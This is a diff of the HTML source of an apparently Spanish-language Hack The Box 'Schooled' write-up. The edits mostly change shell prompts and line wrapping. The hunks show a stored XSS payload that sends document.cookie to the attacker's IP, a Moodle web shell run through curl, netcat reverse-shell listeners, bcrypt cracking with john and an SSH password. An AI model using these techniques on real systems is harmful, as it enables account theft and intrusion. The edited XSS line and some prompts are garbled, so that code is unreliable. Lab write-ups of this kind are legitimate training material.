@@ -1839,8 +1839,7 @@ Host is up (0.36s latency).
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>▒▓    ~c1sc0/HTB/Schooled/nmap    took  6s  ✔ <span class="o">)</span>-<span class="o">[</span>~/htb/schooled<span class="o">]</span>
-└─$ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-m
-       │ edium.txt -H -H <span class="s2">&#34;Host: FUZZ.schooled.htb&#34;</span> --hw=45 --hl=461 <span class="m">20750</span> --hc=404,400 <span class="m">400</span> -t <span class="m">200</span> http://10.10.10.234/
+└─$ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H -H <span class="s2">&#34;Host: FUZZ.schooled.htb&#34;</span> --hw=45 --hl=461 <span class="m">20750</span> --hc=404,400 <span class="m">400</span> -t <span class="m">200</span> http://10.10.10.234/
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="err">&#39;</span>s documentation <span class="k">for</span> more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -1914,7 +1913,7 @@ Look forward to seeing you all soon.
 </div><h2 id="phillips-account">Phillips Account</h2>
 <p>Como sabemos Phillips verifica el campo <code>MoodleNet</code> en el perfil de los estudiantes inscritos en el curso que imparte, con esto, editamos el campo <code>MoodleNet</code> con etiquetas HTML y Javascript para verificar si es vulnerable a inyecciones HTML. Nos percatamos que las etiquetas HTML y codigo Javascript se muestran al visitar nuestro perfil.<br />
 <img src="/images/posts/htb/schooled/Screenshot_7.png" alt="image" /></p>
-<p>Editamos nuevamente ahora con: <code>&lt;script document.&quot;location&quot;&gt;&lt;="http://mi_ip/value_cookie=" + document.cookie </script &gt;</code>, apuntando hacia un archivo de nuestra maquina, verificando nuevamente que la solicitud se realice, esta vez a nuestra maquina.<br />
+<p>Editamos nuevamente ahora con: <code>&lt;script src=&quot;location&quot;&gt;&lt;="http://mi_ip/value_cookie=</script &gt;</code>, apuntando hacia un archivo de nuestra maquina, verificando nuevamente que la solicitud se realice, esta vez a nuestra maquina.<br />
 <img src="/images/posts/htb/schooled/Screenshot_6.png" alt="image" /></p>
 <p>Creamos un miniservidor, despues unos minutos logramos obtener una solicitud de dicho archivo.</p>
 <div class="highlight"><div class="chroma">
@@ -1923,7 +1922,7 @@ Look forward to seeing you all soon.
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
-</span><span class="lnt"> 5
+</span><span class="lnt"> 5                        
 </span><span class="lnt"> 6
 </span><span class="lnt"> 7
 </span><span class="lnt"> 8
@@ -1933,7 +1932,7 @@ Look forward to seeing you all soon.
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/schooled<span class="o">]</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root@parrot~<span class="o">)</span>-<span class="o">[</span>~/htb/schooled<span class="o">]</span>
 └─$ ifconfig tun0 <span class="p">|</span>grep inet <span class="o">&amp;&amp;</span> sudo python3 -m http.server <span class="m">80</span>
         inet 10.10.14.10  netmask 255.255.254.0  destination 10.10.14.10
         inet6 dead:beef:2::1008  prefixlen <span class="m">64</span>  scopeid 0x0&lt;global&gt;
@@ -2047,7 +2046,7 @@ Host: moodle.schooled.htb
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/schooled/tmp<span class="o">]</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root@parrot~<span class="o">)</span>-<span class="o">[</span>~/htb/schooled/tmp<span class="o">]</span>
 └─$ curl -s <span class="s2">&#34;http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id;whoami;pwd;uname%20-a&#34;</span>
 <span class="nv">uid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span>
 www
@@ -2076,7 +2075,7 @@ FreeBSD Schooled 13.0-BETA3 FreeBSD 13.0-BETA3 <span class="c1">#0 releng/13.0-n
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/schooled<span class="o">]</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root@parrot~<span class="o">)</span>-<span class="o">[</span>~/htb/schooled<span class="o">]</span>
 └─$ nc -l -p <span class="m">1338</span>
 id
 <span class="nv">uid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span>
@@ -2289,7 +2288,7 @@ steve:*:1002:1002:User <span class="p">&amp;</span>:/home/steve:/bin/csh
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/schooled<span class="o">]</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root@parrot~<span class="o">)</span>-<span class="o">[</span>~/htb/schooled<span class="o">]</span>
 └─$ john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hashes_mysql_moodl
 Using default input encoding: UTF-8
 Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3<span class="o">])</span>
@@ -2325,7 +2324,7 @@ Session completed
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/schooled<span class="o">]</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root@parrot~<span class="o">)</span>-<span class="o">[</span>~/htb/schooled<span class="o">]</span>
 └─$ ssh jamie@schooled.htb <span class="c1"># !QAZ2wsx</span>
 Password <span class="k">for</span> jamie@Schooled:
 Last login: Tue Mar <span class="m">16</span> 14:44:53 <span class="m">2021</span> from 10.10.14.5
@@ -2628,10 +2627,10 @@ jamie@Schooled:~/packages $
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">╭─kali@kali ~/htb/schooled/repo2  
+<pre class="chroma"><code class="language-bash" data-lang="bash">╭─~c1sc0/HTB/Schooled/nmap ~/htb/schooled/content
 ╰─➤  ls
 a.tar.gz
-╭─kali@kali ~/htb/schooled/repo2  
+╭─~c1sc0/HTB/Schooled/nmap
 ╰─➤  tar -xvf a.tar.gz
 tmp/
 tmp/meta.txz
@@ -2643,12 +2642,12 @@ tar: tmp/bash-6.1.4.txz: <span class="nb">time</span> stamp 2021-04-09 06:05:09 
 tmp/meta.conf
 tar: tmp/meta.conf: <span class="nb">time</span> stamp 2021-04-09 06:05:48 is 53.353078807 s in the future
 tar: tmp: <span class="nb">time</span> stamp 2021-04-09 06:05:48 is 53.353037336 s in the future
-╭─kali@kali ~/htb/schooled/repo2  
+╭─c1sc0/HTB/Schooled/content  
 ╰─➤  ls
 a.tar.gz  tmp
-╭─kali@kali ~/htb/schooled/repo2  
+╭─root@parrot ~/htb/schooled/repo2  
 ╰─➤  mv tmp packages
-╭─kali@kali ~/htb/schooled/repo2  
+╭─c1sc0/HTB/Schooled/nmap
 ╰─➤  sudo python3 -m http.server <span class="m">80</span>
 Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
 </code></pre></td></tr></table>
@@ -2805,7 +2804,7 @@ jamie@Schooled:~ $
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">╭─kali@kali ~/htb/schooled/repo2/packages  
+<pre class="chroma"><code class="language-bash" data-lang="bash">╭─root@parrot ~/htb/schooled/repo2/packages  
 ╰─➤  rlwrap nc -lvvp <span class="m">1339</span>
 listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1339</span> ...
 connect to <span class="o">[</span>10.10.14.145<span class="o">]</span> from schooled.htb <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">13002</span>
